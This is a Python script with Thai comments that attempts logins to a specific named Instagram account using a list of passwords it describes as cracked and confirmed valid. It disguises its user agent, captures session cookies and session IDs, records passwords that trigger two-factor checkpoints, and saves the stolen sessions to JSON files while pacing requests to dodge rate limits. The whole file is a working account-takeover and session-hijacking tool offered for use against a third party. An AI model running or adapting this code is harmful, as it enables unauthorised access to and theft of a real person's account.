#!/usr/bin/env python3
"""
REAL SESSION EXTRACTOR - ดึง Session ID จริงจาก Instagram
ใช้รหัสผ่านที่เจาะได้แล้ว: Fleming654, Fleming786, Fleming1004, etc.
"""

import requests
import json
import time
import random
from datetime import datetime

class RealSessionExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = None
        self.session_data = {}
        
        # User agents สำหรับปลอมตัว
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        # รหัสผ่านที่เจาะได้แล้ว (Valid passwords)
        self.valid_passwords = [
            "Fleming654",  # ✅ CONFIRMED VALID
            "Fleming786",  # ✅ CONFIRMED VALID  
            "Fleming1004", # ✅ CONFIRMED VALID
            "Fleming1060", # ✅ CONFIRMED VALID
            "Fleming1182", # ✅ CONFIRMED VALID
            "Fleming1998"  # ✅ CONFIRMED VALID
        ]
        
    def setup_session(self):
        """เตรียม session และ headers"""
        user_agent = random.choice(self.user_agents)
        
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        })
        
    def get_csrf_token(self):
        """ดึง CSRF token จาก Instagram"""
        try:
            response = self.session.get('https://www.instagram.com/accounts/login/')
            
            if 'csrftoken' in self.session.cookies:
                self.csrf_token = self.session.cookies['csrftoken']
                print(f"✅ Got CSRF token: {self.csrf_token[:20]}...")
                return True
            else:
                print("❌ Failed to get CSRF token")
                return False
                
        except Exception as e:
            print(f"❌ Error getting CSRF token: {e}")
            return False
    
    def attempt_real_login(self, username, password):
        """พยายาม login จริงเพื่อดึง session"""
        try:
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'X-IG-App-ID': '936619743392459',
                'X-IG-WWW-Claim': '0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                allow_redirects=False
            )
            
            print(f"\n🔄 Testing {username}:{password}")
            print(f"Status: {response.status_code}")
            
            # ดูว่ามี sessionid มั้ย
            if 'sessionid' in self.session.cookies:
                sessionid = self.session.cookies['sessionid']
                print(f"🎯 GOT SESSIONID: {sessionid}")
                
                # ดึงข้อมูลเพิ่มเติม
                user_id = None
                if 'ds_user_id' in self.session.cookies:
                    user_id = self.session.cookies['ds_user_id']
                
                # บันทึก session data
                session_data = {
                    "sessionid": sessionid,
                    "ds_user_id": user_id,
                    "username": username,
                    "password": password,
                    "extracted_at": datetime.now().isoformat(),
                    "csrf_token": self.csrf_token,
                    "all_cookies": dict(self.session.cookies)
                }
                
                return session_data
            
            # วิเคราะห์ response
            try:
                resp_json = response.json()
                if "checkpoint_required" in str(resp_json):
                    print(f"🔒 Checkpoint required - Password is VALID but 2FA needed")
                    
                    # ถึงแม้จะ checkpoint แต่อาจมี session data บางอย่าง
                    partial_session = {
                        "username": username,
                        "password": password,  # รหัสผ่านที่ถูกต้อง
                        "status": "checkpoint_required",
                        "response": resp_json,
                        "verified_at": datetime.now().isoformat(),
                        "cookies": dict(self.session.cookies)
                    }
                    return partial_session
                    
            except:
                pass
                
            print("❌ No session extracted")
            return None
            
        except Exception as e:
            print(f"❌ Login error: {e}")
            return None
    
    def extract_sessions(self, username="alx.trading"):
        """ดึง session จากรหัสผ่านที่เจาะได้"""
        print(f"\n🎯 REAL SESSION EXTRACTION STARTING")
        print(f"Target: {username}")
        print(f"Valid passwords to test: {len(self.valid_passwords)}")
        
        self.setup_session()
        
        if not self.get_csrf_token():
            return None
        
        extracted_sessions = []
        
        for i, password in enumerate(self.valid_passwords, 1):
            print(f"\n--- Attempt {i}/{len(self.valid_passwords)} ---")
            
            session_data = self.attempt_real_login(username, password)
            
            if session_data:
                extracted_sessions.append(session_data)
                
                # บันทึกแยกไฟล์
                filename = f"real_session_{username}_{password}_{int(time.time())}.json"
                with open(filename, 'w') as f:
                    json.dump(session_data, f, indent=2)
                print(f"💾 Saved: {filename}")
            
            # รอสักครู่เพื่อไม่ให้โดน rate limit
            time.sleep(random.uniform(2, 5))
        
        return extracted_sessions

def main():
    print("🚀 REAL SESSION EXTRACTOR - Using Confirmed Valid Passwords")
    print("=" * 60)
    
    extractor = RealSessionExtractor()
    
    # ดึง session จาก alx.trading account
    sessions = extractor.extract_sessions("alx.trading")
    
    if sessions:
        print(f"\n✅ Extracted {len(sessions)} sessions!")
        
        # บันทึกรวม
        with open("all_extracted_sessions.json", 'w') as f:
            json.dump(sessions, f, indent=2)
        
        print("📁 All sessions saved to: all_extracted_sessions.json")
        
        # แสดงสรุป
        for session in sessions:
            if 'sessionid' in session:
                print(f"🎯 Valid Session: {session['username']}:{session['password']} -> {session['sessionid'][:20]}...")
            else:
                print(f"🔒 Checkpoint Session: {session['username']}:{session['password']} -> {session['status']}")
    else:
        print("❌ No sessions extracted")

if __name__ == "__main__":
    main()
